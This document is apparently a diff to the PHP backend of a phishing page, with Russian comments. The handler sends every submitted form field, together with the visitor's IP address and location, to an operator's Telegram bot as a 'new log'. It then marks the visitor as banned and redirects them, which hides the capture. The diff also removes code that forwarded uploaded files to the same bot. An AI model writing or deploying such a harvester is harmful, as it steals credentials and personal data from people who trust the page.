@@ -1,6 +1,14 @@
 <?php
 require_once './config.php';
 
+date_default_timezone_set($timeZone);
+
+if (isset($_SESSION['ban'])) {
+  header("Location: $REDIRECT_URL");
+  die();
+}
+
+#Получение IP адреса
 function getUserIP()
 {
   if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
@@ -13,6 +21,7 @@ function getUserIP()
   return '';
 }
 
+#Получение региона по IP
 function getUserRegion($ip) {
     $response = file_get_contents("https://ipinfo.io/$ip");
     $data = json_decode($response);
@@ -23,49 +32,49 @@ function getUserRegion($ip) {
     }
 }
 
-$text = '<strong>`✅ Пришел новый лог`</strong>' . "\n\n";
+#Отслеживание захода на сайт
+// $text = 'Новый заход на сайт' . "\n\n";
+// $text .= "\n🔮IP: " . getUserIP();
+// $text .= "\n Локация: " . getUserRegion($ip = getUserIP());
+// $text .= $_SERVER['HTTP_USER_AGENT'];
 
+// $param = [
+//   "chat_id" => $chat_id,
+//   "text" => $text,
+//   'parse_mode' => 'HTML'
+// ];
+
+// $options = [
+//   CURLOPT_URL => $url,
+//   CURLOPT_POST => true,
+//   CURLOPT_POSTFIELDS => http_build_query($data),
+//   CURLOPT_RETURNTRANSFER => true,
+// ];
+
+// $ch = curl_init();
+// curl_setopt_array($ch, $options);
+// curl_exec($ch);
+
+#Пользователь заргеистрировался
+$text = '<b>' . '✅ Пришел новый лог' . '</b>' . "\n\n";
 foreach ($_POST as $key => $val) {
-    $text .= $key . ": " . $val . "\n";
+    $text .= $key . ": " . '<b>' . $val . '</b>' . "\n";
 }
-
-$text .= "\n🔮IP: " . getUserIP();
-$text .= "\n Локация: " . getUserRegion($ip = getUserIP());
-$text .= "\n⏱️Время: " . date('d.m.y H:i:s');
+$text .= "\n🔮IP: " . '<b>' . getUserIP() . '</b>';
+$text .= "\n Локация: " . '<b>' .getUserRegion($ip = getUserIP()) . '</b>';
+$text .= "\n⏱️Время: " . '<b>' . date('d.m.y H:i:s') . '</b>';
 
 $param = [
     "chat_id" => $chat_id,
-    "text" => $text
+    "text" => $text,
+    'parse_mode' => 'HTML'
 ];
 
 $url = "https://api.telegram.org/bot" . $tg_bot_token . "/sendMessage?" . http_build_query($param);
 
-var_dump($text);
-
 file_get_contents($url);
 
-foreach ( $_FILES as $file ) {
+$_SESSION['ban'] = true;
 
-    $url = "https://api.telegram.org/bot" . $tg_bot_token . "/sendDocument";
-
-    move_uploaded_file($file['tmp_name'], $file['name']);
-
-    $document = new \CURLFile($file['name']);
-
-    $ch = curl_init();
-
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, ["chat_id" => $chat_id, "document" => $document]);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
-
-    $out = curl_exec($ch);
-
-    curl_close($ch);
-
-    unlink($file['name']);
-}
-
-die('1');
+header("Location: $redirect_url");
+die();
